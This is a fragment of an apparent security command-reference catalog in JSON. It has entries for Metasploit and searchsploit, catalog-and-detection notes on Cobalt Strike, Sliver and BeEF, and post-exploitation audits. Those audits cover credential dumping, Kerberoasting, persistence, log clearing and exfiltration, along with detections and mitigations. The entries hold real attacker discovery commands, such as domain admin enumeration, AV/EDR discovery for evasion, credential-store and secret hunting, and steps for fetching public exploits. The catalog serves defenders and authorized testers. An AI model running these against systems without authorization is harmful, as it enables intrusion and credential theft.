 {"id":"exp-msf-resource-script","cat":"Exploitation Frameworks","title":"Automate with resource scripts","desc":"Batch msfconsole commands into an .rc resource script and replay them with -r or resource.","danger":"Authorized use only. Resource scripts can chain scans and exploits unattended; review before running and keep within scope.","tags":["exploitation","automation","scheduling"],"code":{"linux":"# setup.rc contains one msfconsole command per line, e.g.:\n#   workspace -a {{ENGAGEMENT:client}}\n#   db_nmap -sV {{TARGET:10.0.0.0/24}}\n#   hosts\n\n# From a shell:\nmsfconsole -q -r {{FILE:setup.rc}}\n\n# Or from inside msfconsole:\nresource {{FILE:setup.rc}}"}},
 {"id":"exp-searchsploit-search","cat":"Exploitation Frameworks","title":"Look up public exploits with searchsploit","desc":"Query the offline Exploit-DB copy (exploitdb package / searchsploit) by product, version, or CVE.","danger":"Authorized use only. searchsploit is a research lookup; using the referenced exploits against systems without permission is illegal.","tags":["exploitation","recon","reference"],"code":{"linux":"# exploitdb package (preinstalled on Kali)\nsearchsploit {{PRODUCT:apache 2.4}}\nsearchsploit --cve {{CVE:2021-41773}}\nsearchsploit -t {{TERM:samba}}       # title-only search\nsearchsploit -w {{PRODUCT:openssh}}  # include Exploit-DB URLs","mac":"# Installed via: brew install exploitdb\nsearchsploit {{PRODUCT:apache 2.4}}"}},
 {"id":"exp-searchsploit-examine","cat":"Exploitation Frameworks","title":"Read and copy a searchsploit entry","desc":"Examine an Exploit-DB entry's source with -x and copy it to the working directory with -m.","danger":"Authorized use only. Copied exploit code is for authorized testing and study; never run untrusted exploit code against production or third-party systems.","tags":["exploitation","reference"],"code":{"linux":"searchsploit -p {{ID:50383}}   # show the file path and metadata\nsearchsploit -x {{ID:50383}}   # view the exploit source in a pager\nsearchsploit -m {{ID:50383}}   # mirror (copy) it into the current directory","mac":"searchsploit -m {{ID:50383}}"}},
 {"id":"exp-msf-update","cat":"Exploitation Frameworks","title":"Update Metasploit and Exploit-DB","desc":"Refresh the framework and the searchsploit database to pull the latest modules and entries.","danger":"Requires network access and package privileges. Only update from official repositories.","tags":["exploitation","tools","package-manager"],"code":{"linux":"# Kali/Debian: update via the package manager\nsudo apt update && sudo apt install --only-upgrade metasploit-framework\n\n# Update the offline Exploit-DB copy\nsudo searchsploit -u","mac":"# Framework was installed as a cask (brew install --cask metasploit)\nbrew update && brew upgrade --cask metasploit\n\n# Update the offline Exploit-DB copy (exploitdb formula)\nsearchsploit -u"}},
 {"id":"exp-cobaltstrike-detect","cat":"Exploitation Frameworks","title":"Cobalt Strike (catalog and detection)","desc":"Commercial adversary-simulation C2; commonly abused. Catalog and detection only — no payloads here.","danger":"Cobalt Strike is a licensed red-team C2 platform and one of the most abused tools by real intruders. Study its indicators for defense; do not deploy without a license and authorization.","team":"red","attack":["T1071.001","T1573"],"detect":"Default/known JARM and JA3/JA3S TLS fingerprints; named pipes matching default patterns (e.g. \\\\.\\pipe\\msagent_*, postex_*); beacon jitter/sleep regularity in NetFlow; malleable-C2 profile artifacts in HTTP headers/URIs; memory scanners and Sigma/Suricata Cobalt Strike rules. Practice detection on a lab, not production.","mitigate":"TLS inspection with JARM/JA3 fingerprinting, EDR with beacon and named-pipe detection, egress filtering, and blocking known C2 infrastructure via threat intel.","tags":["exploitation","post-ex","detection"],"code":{"linux":"# No operational commands published here.\n# Learn detection safely in a lab environment:\n#   https://www.cobaltstrike.com/  (official)\n#   Detection practice: https://tryhackme.com  /  https://www.hackthebox.com\necho 'Study Cobalt Strike indicators: JARM/JA3, named pipes, beacon timing.'"}},
 {"id":"exp-sliver-detect","cat":"Exploitation Frameworks","title":"Sliver C2 (catalog and detection)","desc":"Open-source cross-platform adversary-emulation C2 framework. Catalog and detection only.","danger":"Sliver is a legitimate red-team C2 that is increasingly abused in real intrusions. Understand its indicators; only operate it under explicit authorization.","team":"red","attack":["T1071","T1573.002"],"detect":"Default mTLS certificate patterns and JARM fingerprints; unusual DNS-over-HTTPS or long TXT-record DNS C2 volume; WireGuard/mTLS beaconing to non-business hosts; implant artifacts flagged by EDR and YARA community rules.","mitigate":"Egress and DNS monitoring/filtering, JARM/mTLS fingerprinting at the perimeter, EDR behavioral detection, and blocking anomalous outbound encrypted channels.","tags":["exploitation","post-ex","detection"],"code":{"linux":"# No operational commands published here.\n# Study detection in an isolated lab:\n#   Official: https://github.com/BishopFox/sliver\n#   Labs: https://www.hackthebox.com  /  https://tryhackme.com\necho 'Study Sliver indicators: default certs, JARM, DNS/mTLS beaconing.'"}},
 {"id":"exp-beef-detect","cat":"Exploitation Frameworks","title":"BeEF browser exploitation (catalog and detection)","desc":"Browser Exploitation Framework that hooks browsers via injected JavaScript. Catalog and detection only.","danger":"Authorized use only. BeEF hooks victim browsers and is for approved social-engineering/web assessments in a lab or sanctioned test.","team":"red","attack":["T1185","T1059.007"],"detect":"Requests for hook.js and periodic XHR/polling back to a BeEF server appear in web-proxy and browser logs; injected script tags on pages that should not carry them; regular beacon intervals from a browser to an unfamiliar host.","mitigate":"Strict Content-Security-Policy, subresource integrity, output encoding to prevent XSS injection points, egress filtering, and proxy alerts on hook.js / known BeEF URIs.","tags":["exploitation","web","detection"],"code":{"linux":"# No operational commands published here.\n# Learn the hook/detection flow in a lab:\n#   Official: https://github.com/beefproject/beef\n#   Labs: https://tryhackme.com  /  https://www.hackthebox.com\necho 'Detect BeEF: hook.js requests and periodic browser XHR beaconing.'"}},

/* ================= POST-EXPLOITATION ================= */
 {"id":"post-situational-awareness","cat":"Post-Exploitation","title":"Local situational awareness","desc":"First-move discovery a foothold runs: current user, host, and network config. Read-only.","danger":"Read-only, but the same commands attackers run post-compromise. Run only on systems you own or are authorized to assess.","team":"purple","tags":["discovery","enumeration","cross-platform","post-ex"],"attack":["T1082","T1033","T1016"],"detect":"EDR command-line telemetry showing whoami/hostname/ipconfig run in quick succession, especially by service or non-interactive accounts.","mitigate":"Baseline normal admin activity and alert on discovery-command bursts; enforce least privilege so a foothold sees little.","code":{"ps":"whoami /all\nhostname\nipconfig /all","cmd":"whoami /all & hostname & ipconfig /all","mac":"whoami; id; hostname\nifconfig | grep 'inet '\nsw_vers","linux":"whoami; id; hostname\nip -brief addr\nuname -a"}},
 {"id":"post-account-discovery","cat":"Post-Exploitation","title":"Local account & group discovery","desc":"Enumerate local users and privileged group membership to map targets for escalation.","danger":"Read-only enumeration; authorized assessments only.","team":"purple","tags":["account","enumeration","discovery"],"attack":["T1087.001","T1069.001"],"detect":"Windows 4798 (local group membership enumerated) / 4799; repeated net.exe or dscl calls listing admin groups.","mitigate":"Minimize local admin membership; use LAPS for unique local passwords; alert on group-enumeration events.","code":{"ps":"Get-LocalUser\nGet-LocalGroupMember Administrators\nnet localgroup administrators","cmd":"net user\nnet localgroup administrators","mac":"dscl . -list /Users | grep -v '^_'\ndscl . -read /Groups/admin GroupMembership","linux":"getent passwd | cut -d: -f1\ngetent group sudo wheel"}},
 {"id":"post-domain-account-discovery","cat":"Post-Exploitation","title":"Domain account & group discovery","desc":"Enumerate domain users and high-value groups from a domain-joined host. Get-AD* needs RSAT.","danger":"Read-only, but heavy directory enumeration is a classic pre-lateral-movement signal. Authorized only.","team":"purple","tags":["active-directory","account","discovery","ldap"],"attack":["T1087.002","T1069.002"],"detect":"Security 4661/4662 directory-object access and high-volume LDAP queries from one host (BloodHound-style collection patterns).","mitigate":"Enable AD auditing; deploy honey-accounts; limit anonymous/broad LDAP reads; monitor for mass enumeration.","code":{"ps":"net user /domain\nnet group \"Domain Admins\" /domain\n# RSAT ActiveDirectory module:\nGet-ADGroupMember \"Domain Admins\" | Select-Object name","cmd":"net user /domain\nnet group \"Domain Admins\" /domain"}},
 {"id":"post-share-discovery","cat":"Post-Exploitation","title":"Network share discovery","desc":"Find reachable SMB/network shares to hunt for data and lateral paths. Linux uses smbclient (Samba); macOS uses built-in smbutil.","danger":"Touching remote shares generates access logs; only enumerate authorized hosts.","team":"purple","tags":["smb","discovery","network"],"attack":["T1135"],"detect":"Windows 5140/5145 (share accessed) spikes; SMB tree-connect bursts to many hosts from one source.","mitigate":"Remove unnecessary shares; restrict share ACLs; disable SMBv1; monitor east-west SMB.","code":{"ps":"net view \\\\{{HOST:fileserver}}\nGet-SmbShare\nnet share","cmd":"net view \\\\{{HOST:fileserver}}\nnet share","mac":"smbutil view //{{USER:guest}}@{{HOST:fileserver}}","linux":"smbclient -L //{{HOST:fileserver}} -N"}},
 {"id":"post-process-secsoftware-discovery","cat":"Post-Exploitation","title":"Process & security-software discovery","desc":"List running processes and installed AV/EDR so an operator can plan evasion. SecurityCenter2 is client-Windows only.","danger":"Read-only; enumerating defensive products is reconnaissance for evasion. Authorized only.","team":"purple","tags":["process","discovery","detection"],"attack":["T1057","T1518.001"],"detect":"Queries to WMI root/SecurityCenter2, tasklist/Get-Process filtering for AV/EDR names, or reads of vendor install paths.","mitigate":"Enable tamper protection so product state can't be read/changed; alert on SecurityCenter2 enumeration.","code":{"ps":"Get-Process | Sort-Object CPU -Descending | Select-Object -First 15\nGet-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct |\n  Select-Object displayName, productState","cmd":"tasklist /svc","mac":"ps -axo pid,user,%cpu,comm | head -20","linux":"ps -eo pid,user,%cpu,comm --sort=-%cpu | head -20"}},
 {"id":"post-lsass-credential-dump","cat":"Post-Exploitation","title":"LSASS credential dumping (catalog + detect)","desc":"Concept only: attackers read LSASS memory for plaintext creds/hashes (Mimikatz, comsvcs.dll). Practice on HackTheBox/TryHackMe, not production. Hunt query below needs Sysmon.","danger":"No dumping command provided. Reading LSASS requires SYSTEM and exposes live credentials; authorized IR/red-team only.","team":"purple","tags":["memory","detection","windows","post-ex"],"attack":["T1003.001"],"detect":"Sysmon EID 10 process-access to lsass.exe with GrantedAccess 0x1010/0x1410/0x143a; Security 4656/4663 handle requests to lsass; comsvcs.dll MiniDump in command lines.","mitigate":"Enable LSA Protection (RunAsPPL), Credential Guard, and the ASR rule 'block credential stealing from lsass'; restrict debug privilege.","code":{"ps":"# Hunt Sysmon process-access to LSASS (requires Sysmon)\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=10} -MaxEvents 300 |\n  Where-Object { $_.Message -match 'lsass' } |\n  Select-Object TimeCreated, Id -First 20"}},
 {"id":"post-sam-hive-theft","cat":"Post-Exploitation","title":"SAM/SECURITY hive theft (catalog + detect)","desc":"Concept: attackers copy SAM/SYSTEM/SECURITY hives (reg save, esentutl, shadow copy) to crack local hashes offline. Hunt via process-creation logs.","danger":"No extraction command provided; hive theft needs local admin. Authorized only.","team":"purple","tags":["registry","windows","detection"],"attack":["T1003.002"],"detect":"Process creation of reg.exe save / esentutl of SAM,SYSTEM,SECURITY; access to \\Device\\HarddiskVolumeShadowCopy; vssadmin create shadow.","mitigate":"Restrict local admin; enable Credential Guard (protects cached domain creds); monitor VSS creation and hive access.","code":{"ps":"# Hunt reg-hive theft via 4688 process creation (needs command-line auditing)\nGet-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 500 |\n  Where-Object { $_.Message -match 'reg.*save' -and $_.Message -match 'SAM|SYSTEM|SECURITY' }"}},
 {"id":"post-unsecured-credentials","cat":"Post-Exploitation","title":"Hunt unsecured credentials in files","desc":"Defensive sweep for plaintext secrets left in scripts/configs — the same data an operator harvests post-foothold.","danger":"Reads file contents; scope PATH and run only where authorized.","team":"purple","tags":["password","detection","cross-platform"],"attack":["T1552.001"],"detect":"Mass sequential file reads / recursive grep over home and config dirs; access to .env, id_rsa, unattend.xml, web.config.","mitigate":"Move secrets to a vault/secret manager; add pre-commit and repo secret scanning; remove plaintext creds; tighten config-file ACLs.","code":{"ps":"Get-ChildItem {{PATH:C:\\Users}} -Recurse -Include *.txt,*.ini,*.config,*.xml,*.ps1 -ErrorAction SilentlyContinue |\n  Select-String -Pattern 'password\\s*=|api[_-]?key|secret' | Select-Object -First 50","linux":"grep -rInE 'password[[:space:]]*=|api[_-]?key|secret|BEGIN [A-Z]* PRIVATE KEY' {{PATH:/home}} 2>/dev/null | head -50","mac":"grep -rInE 'password[[:space:]]*=|api[_-]?key|secret|BEGIN [A-Z]* PRIVATE KEY' {{PATH:/Users}} 2>/dev/null | head -50","py":"import os, re\npat = re.compile(r'password\\s*=|api[_-]?key|secret|PRIVATE KEY', re.I)\nfor dp, _, fs in os.walk(r'{{PATH:.}}'):\n    for f in fs:\n        p = os.path.join(dp, f)\n        try:\n            with open(p, errors='ignore') as fh:\n                for i, line in enumerate(fh, 1):\n                    if pat.search(line):\n                        print(f\"{p}:{i}: {line.strip()[:120]}\")\n        except OSError:\n            pass"}},
 {"id":"post-browser-vault-credentials","cat":"Post-Exploitation","title":"Browser & OS vault credential theft (catalog + detect)","desc":"Catalog: attackers pull saved logins from browser stores (Login Data, logins.json) and OS vaults (Credential Manager, Keychain). Below lists store locations to monitor.","danger":"Locating stores is benign; decrypting saved creds is offensive. Authorized only.","team":"purple","tags":["password","detection","cross-platform"],"attack":["T1555.003","T1555.001"],"detect":"Non-browser processes opening Login Data / logins.json / the login keychain; DPAPI blob access outside the owning app.","mitigate":"Discourage saving privileged creds in browsers; enable app-bound encryption; EDR file-access rules on credential stores.","code":{"ps":"cmdkey /list\nGet-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -ErrorAction SilentlyContinue","mac":"ls -l ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data 2>/dev/null\nsecurity list-keychains","linux":"ls -l ~/.config/google-chrome/Default/Login\\ Data ~/.mozilla/firefox/*/logins.json 2>/dev/null"}},
 {"id":"post-dcsync","cat":"Post-Exploitation","title":"DCSync replication abuse (catalog + detect)","desc":"Concept: an account with replication rights impersonates a DC to pull password hashes (incl. krbtgt). Detection query runs against a DC's Security log.","danger":"No attack command provided; requires Replicating Directory Changes rights. Authorized only.","team":"purple","tags":["active-directory","detection","windows"],"attack":["T1003.006"],"detect":"Security 4662 referencing replication GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes) from a non-DC account or host.","mitigate":"Minimize accounts holding replication rights; protect tier-0; alert on replication from anything other than domain controllers.","code":{"ps":"# Run on a DC's Security log\nGet-WinEvent -FilterHashtable @{LogName='Security';Id=4662} -MaxEvents 500 |\n  Where-Object { $_.Message -match '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' }"}},
 {"id":"post-kerberoasting","cat":"Post-Exploitation","title":"Kerberoasting (catalog + detect)","desc":"Concept: request service tickets for SPN accounts and crack them offline for the service password. Below inventories kerberoastable accounts. Get-ADUser needs RSAT.","danger":"No cracking workflow provided. Authorized AD assessments only.","team":"purple","tags":["active-directory","password","detection"],"attack":["T1558.003"],"detect":"Security 4769 TGS requests with encryption type 0x17 (RC4) and/or high service-ticket volume from a single account.","mitigate":"Use gMSA or long random service passwords; enforce AES and disable RC4; alert on RC4 TGS bursts.","code":{"ps":"# RSAT ActiveDirectory:\nGet-ADUser -Filter 'ServicePrincipalName -like \"*\"' -Properties ServicePrincipalName |\n  Select-Object SamAccountName, ServicePrincipalName\n# Without RSAT:\nsetspn -Q */*"}},
 {"id":"post-scheduled-task-cron","cat":"Post-Exploitation","title":"Scheduled task / cron persistence (audit)","desc":"Audit scheduled tasks, cron jobs, and systemd timers where attackers hide persistence.","danger":"Read-only audit. Creating persistence needs privilege — authorized only.","team":"purple","tags":["persistence","scheduling","detection"],"attack":["T1053.005","T1053.003"],"detect":"Windows 4698 (task created); new files in /etc/cron.* or systemd timer units; auditd watches on cron paths.","mitigate":"Restrict task/cron creation to admins; baseline scheduled jobs; alert on new or modified persistence entries.","code":{"ps":"Get-ScheduledTask | Where-Object State -ne 'Disabled' |\n  Select-Object TaskPath, TaskName, State\nschtasks /query /fo LIST /v","cmd":"schtasks /query /fo LIST /v","mac":"crontab -l 2>/dev/null\nls -la /Library/LaunchDaemons ~/Library/LaunchAgents 2>/dev/null","linux":"crontab -l 2>/dev/null\nls -la /etc/cron.d /etc/cron.daily\nsystemctl list-timers --all"}},
 {"id":"post-run-keys","cat":"Post-Exploitation","title":"Registry Run keys & Startup persistence (audit)","desc":"Audit autostart locations (Run keys, Startup folder) commonly abused for persistence.","danger":"Read-only audit; authorized only.","team":"purple","tags":["persistence","registry","windows"],"attack":["T1547.001"],"detect":"Sysmon 12/13 registry writes to Run/RunOnce keys; Security 4657; new files in Startup folders.","mitigate":"Baseline autoruns (Sysinternals Autoruns); restrict HKLM writes; app allowlisting (WDAC/AppLocker).","code":{"ps":"'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',\n'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' |\n  ForEach-Object { Get-ItemProperty $_ -ErrorAction SilentlyContinue }\nGet-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location","cmd":"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\""}},
 {"id":"post-service-daemon-persistence","cat":"Post-Exploitation","title":"Service / daemon persistence (audit)","desc":"Audit Windows services, launchd agents/daemons, and systemd units for attacker-installed persistence.","danger":"Read-only audit; installing services/daemons needs privilege. Authorized only.","team":"purple","tags":["persistence","detection","cross-platform"],"attack":["T1543.003","T1543.001","T1543.002"],"detect":"Windows 7045 (service installed); new .plist in LaunchDaemons/LaunchAgents; new .service units; binaries in user-writable paths.","mitigate":"Restrict service/daemon creation; monitor unusual binary paths; sign services; baseline enabled units.","code":{"ps":"Get-CimInstance Win32_Service |\n  Where-Object { $_.PathName -notmatch 'C:\\\\Windows|Program Files' } |\n  Select-Object Name, StartMode, State, PathName","mac":"launchctl list\nls -la /Library/LaunchDaemons /Library/LaunchAgents ~/Library/LaunchAgents 2>/dev/null","linux":"systemctl list-unit-files --type=service --state=enabled\nls -la /etc/systemd/system"}},
 {"id":"post-account-persistence","cat":"Post-Exploitation","title":"Account creation / manipulation persistence (audit)","desc":"Audit for backdoor accounts, unexpected privileged-group additions, and rogue UID-0 users.","danger":"Read-only audit; account/group changes require privilege. Authorized only.","team":"purple","tags":["persistence","account","detection"],"attack":["T1136.001","T1098"],"detect":"Windows 4720 (account created), 4728/4732 (added to privileged group); auditd useradd/usermod; new UID-0 line in /etc/passwd.","mitigate":"Approval workflow for account changes; alert on privileged-group edits; disable unused accounts; least privilege.","code":{"ps":"Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet\nGet-LocalGroupMember Administrators","cmd":"net user\nnet localgroup administrators","mac":"dscl . -list /Users UniqueID | awk '$2<500'\nlast | head","linux":"awk -F: '$3==0{print $1\" UID0\"}' /etc/passwd\ngetent group sudo wheel\nlastlog | grep -v 'Never'"}},
 {"id":"post-ssh-authorized-keys","cat":"Post-Exploitation","title":"SSH authorized_keys persistence (audit)","desc":"Audit authorized_keys files for attacker-planted public keys — a stealthy Unix backdoor.","danger":"Read-only audit; modifying authorized_keys grants standing access. Authorized only.","team":"purple","tags":["persistence","remote","cross-platform"],"attack":["T1098.004"],"detect":"Creation/modification of authorized_keys, unexpected key entries, or FIM/auditd alerts on ~/.ssh writes.","mitigate":"Centralize key management; file-integrity monitoring on authorized_keys; prefer CA-signed certificates; review keys regularly.","code":{"linux":"for f in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do\n  [ -f \"$f\" ] && echo \"== $f ==\" && cat \"$f\"\ndone\nfind /home /root -name authorized_keys -mtime -7 2>/dev/null -exec ls -l {} \\;","mac":"cat ~/.ssh/authorized_keys 2>/dev/null\nfind /Users -name authorized_keys -mtime -7 2>/dev/null -exec ls -l {} \\;"}},
 {"id":"post-wmi-subscription","cat":"Post-Exploitation","title":"WMI event subscription persistence (audit)","desc":"Enumerate permanent WMI event filters, consumers, and bindings used for fileless persistence.","danger":"Read-only audit; creating subscriptions needs admin. Authorized only.","team":"purple","tags":["persistence","windows","sysmon"],"attack":["T1546.003"],"detect":"Sysmon 19/20/21 (WMI filter/consumer/binding registered); new CommandLineEventConsumer or ActiveScriptEventConsumer.","mitigate":"Baseline permanent WMI subscriptions; alert on new consumers; restrict WMI namespace writes to admins.","code":{"ps":"Get-CimInstance -Namespace root/subscription -ClassName __EventFilter |\n  Select-Object Name, Query\nGet-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer |\n  Select-Object Name, CommandLineTemplate\nGet-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding"}},
 {"id":"post-remote-services-lateral","cat":"Post-Exploitation","title":"Remote-service lateral movement (audit logons)","desc":"Review RDP/SMB/WinRM/SSH logons to spot lateral movement between hosts.","danger":"Read-only log review; authorized only.","team":"purple","tags":["remote","detection","logs"],"attack":["T1021.001","T1021.002","T1021.004"],"detect":"Windows 4624 logon type 3/10 from new sources; RDP 4778/4779; SSH 'Accepted' from unusual IPs; new WinRM sessions.","mitigate":"Funnel remote admin through jump hosts; require MFA; segment networks; disable unused remote services.","code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 300 |\n  Where-Object { $_.Message -match 'Logon Type:\\s+(3|10)' } |\n  Format-Table TimeCreated, Id -AutoSize","linux":"last -a | head -20\njournalctl -u ssh -u sshd --since '-24h' 2>/dev/null | grep -Ei 'Accepted|Failed' | tail -20","mac":"last | head -20\nlog show --last 24h --predicate 'process == \"sshd\"' 2>/dev/null | grep -i accepted | tail"}},
 {"id":"post-pass-the-hash-ticket","cat":"Post-Exploitation","title":"Pass-the-Hash / Pass-the-Ticket (catalog + detect)","desc":"Concept: reuse stolen NTLM hashes or Kerberos tickets to authenticate without the plaintext password. Detection hunt below.","danger":"No attack command provided; requires harvested credential material. Authorized only.","team":"purple","tags":["active-directory","detection","windows"],"attack":["T1550.002","T1550.003"],"detect":"Security 4624 LogonType 9 (NewCredentials/seclogo) with NTLM; NTLM where Kerberos is expected; anomalous ticket lifetimes or mismatched account/host.","mitigate":"Credential Guard; unique local admin passwords (LAPS); tiered admin model; restrict/disable NTLM.","code":{"ps":"# Hunt LogonType 9 (seclogo) NTLM logons — overpass/PtH pattern\nGet-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 500 |\n  Where-Object { $_.Message -match 'Logon Type:\\s+9' -and $_.Message -match 'seclogo' }"}},
 {"id":"post-remote-execution","cat":"Post-Exploitation","title":"Remote execution: PsExec / WMI / WinRM (catalog + detect)","desc":"Concept: execute commands on remote hosts via service creation (PsExec), WMI, or WinRM. Detection hunts below.","danger":"No attack command provided; requires admin on the target. Authorized only.","team":"purple","tags":["remote","detection","windows"],"attack":["T1569.002","T1047"],"detect":"Windows 7045 PSEXESVC service install; wmiprvse.exe or wsmprovhost.exe spawning cmd/powershell; named-pipe indicators in 4688.","mitigate":"Restrict admin shares and SMB; disable unused WinRM; monitor service installs; app allowlisting.","code":{"ps":"# PsExec service install:\nGet-WinEvent -FilterHashtable @{LogName='System';Id=7045} -MaxEvents 200 |\n  Where-Object { $_.Message -match 'PSEXESVC|PsExec' }\n# WMI / WinRM exec parents (needs Sysmon EID 1):\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} -MaxEvents 500 |\n  Where-Object { $_.Message -match 'ParentImage:.*(wmiprvse|wsmprovhost)' }"}},
 {"id":"post-clear-logs","cat":"Post-Exploitation","title":"Indicator removal: log clearing (detect)","desc":"Detect cleared or tampered event/audit logs — a common anti-forensic step after compromise.","danger":"Detection-only. Clearing logs to hide activity is offensive and destructive. Authorized only.","team":"purple","tags":["logs","detection","incident-response"],"attack":["T1070.001","T1070.002"],"detect":"Security 1102 (audit log cleared); System 104 (event log cleared); unexpectedly empty/zeroed logs; journal verification failures; gaps in sequence numbers.","mitigate":"Forward logs off-host to a SIEM/syslog in real time; restrict the 'manage auditing and security log' right; alert on 1102/104.","code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security';Id=1102} -MaxEvents 20\nGet-WinEvent -FilterHashtable @{LogName='System';Id=104} -MaxEvents 20","linux":"ls -la /var/log/auth.log* /var/log/secure* 2>/dev/null\nlast -x | grep -Ei 'reboot|shutdown' | head\njournalctl --verify 2>&1 | tail","mac":"ls -la /var/log/system.log*\nlog show --last 24h --predicate 'eventMessage CONTAINS \"log\"' 2>/dev/null | tail"}},
 {"id":"post-impair-defenses","cat":"Post-Exploitation","title":"Impair defenses: AV / firewall / logging (audit)","desc":"Verify security controls are still enabled — attackers disable AV, firewalls, and logging before acting.","danger":"Read-only status check; disabling controls needs admin/root and is offensive. Authorized only.","team":"purple","tags":["detection","incident-response","cross-platform"],"attack":["T1562.001"],"detect":"Defender 5001/5010, Set-MpPreference DisableRealtimeMonitoring, new AV exclusions; firewall-disabled events; auditd/rsyslog stopped.","mitigate":"Enable Tamper Protection; alert on AV/firewall/logging config changes; restrict admin; enforce central config management.","code":{"ps":"Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, TamperProtectionSource\nGet-MpPreference | Select-Object -ExpandProperty ExclusionPath\nGet-NetFirewallProfile | Select-Object Name, Enabled","linux":"systemctl is-active auditd rsyslog 2>/dev/null\ncommand -v ufw >/dev/null && sudo ufw status\nsysctl kernel.yama.ptrace_scope","mac":"/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\nspctl --status\ncsrutil status"}},
 {"id":"post-archive-staging","cat":"Post-Exploitation","title":"Collection staging & archiving (detect)","desc":"Hunt recently created large or password-protected archives staged for exfiltration.","danger":"Read-only hunt; authorized only.","team":"purple","tags":["post-ex","detection","cross-platform"],"attack":["T1560.001","T1074.001"],"detect":"Creation of large or password-protected archives (7z/rar/zip) before exfil; staging in temp/AppData; Sysmon 11 file-create bursts.","mitigate":"DLP; monitor archive utilities on servers; egress filtering; alert on large temp files and rare archive tools.","code":{"ps":"Get-ChildItem $env:TEMP,$env:USERPROFILE -Recurse -Include *.zip,*.7z,*.rar,*.tar,*.gz -ErrorAction SilentlyContinue |\n  Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-2) -and $_.Length -gt 10MB } |\n  Sort-Object Length -Descending | Select-Object FullName, Length, LastWriteTime -First 20","linux":"find {{PATH:/tmp}} /home -type f \\( -name '*.zip' -o -name '*.tar.gz' -o -name '*.7z' -o -name '*.rar' \\) -mtime -2 -size +10M 2>/dev/null -exec ls -lh {} \\;","mac":"find {{PATH:/tmp}} /Users -type f \\( -name '*.zip' -o -name '*.tar.gz' -o -name '*.7z' -o -name '*.rar' \\) -mtime -2 -size +10M 2>/dev/null -exec ls -lh {} \\;"}},
 {"id":"post-exfil-channels","cat":"Post-Exploitation","title":"Exfiltration & C2 channels (detect)","desc":"Review established outbound connections to spot exfil over C2 or alternate protocols (incl. DNS tunneling).","danger":"Read-only network review; authorized only.","team":"purple","tags":["network","detection","incident-response"],"attack":["T1041","T1048.003","T1071.004"],"detect":"Large sustained outbound to a single external IP; periodic beaconing; long/high-volume DNS TXT queries; connections to new/rare ASNs.","mitigate":"Egress allowlisting; DNS monitoring and sinkholing; proxy inspection; DLP; alert on beaconing periodicity.","code":{"ps":"Get-NetTCPConnection -State Established |\n  Where-Object { $_.RemoteAddress -notmatch '^(127\\.|::1|10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.)' } |\n  Select-Object RemoteAddress, RemotePort, OwningProcess | Sort-Object RemoteAddress","linux":"ss -tunp | grep ESTAB | grep -vE '127\\.0\\.0\\.1|::1'\n# DNS-tunneling hint: watch resolver logs for long/frequent TXT queries","mac":"lsof -nP -iTCP -sTCP:ESTABLISHED | grep -vE '127\\.0\\.0\\.1|::1'"}},

/* ================= FILE TRANSFER & SYNC ================= */
 {"id":"xfer-scp-file","cat":"File Transfer & Sync","title":"Copy a file over SSH (scp)","desc":"Push a local file to a remote host over SSH; swap the two arguments to pull instead. scp ships by default in the OpenSSH client (Windows 10+, macOS, Linux).","tags":["file-transfer","remote","cross-platform"],"code":{"ps":"scp {{FILE:.\\data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","cmd":"scp {{FILE:data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","mac":"scp {{FILE:./data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","linux":"scp {{FILE:./data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}"}},
 {"id":"xfer-scp-recursive","cat":"File Transfer & Sync","title":"Copy a directory tree over SSH","desc":"Recursively copy a whole directory to a remote host with scp -r.","tags":["file-transfer","remote","cross-platform"],"code":{"ps":"scp -r {{DIR:.\\project}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","mac":"scp -r {{DIR:./project}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","linux":"scp -r {{DIR:./project}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}"}},
 {"id":"xfer-scp-port-key","cat":"File Transfer & Sync","title":"scp on a custom port with a key file","desc":"Use -P for a non-default SSH port and -i to select an identity/private key. Note: scp uses -P (uppercase) for port, unlike ssh's -p.","tags":["file-transfer","remote","cross-platform"],"code":{"mac":"scp -P {{PORT:2222}} -i {{KEY:~/.ssh/id_ed25519}} {{FILE:./data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","linux":"scp -P {{PORT:2222}} -i {{KEY:~/.ssh/id_ed25519}} {{FILE:./data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","ps":"scp -P {{PORT:2222}} -i {{KEY:$HOME\\.ssh\\id_ed25519}} {{FILE:.\\data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}"}},
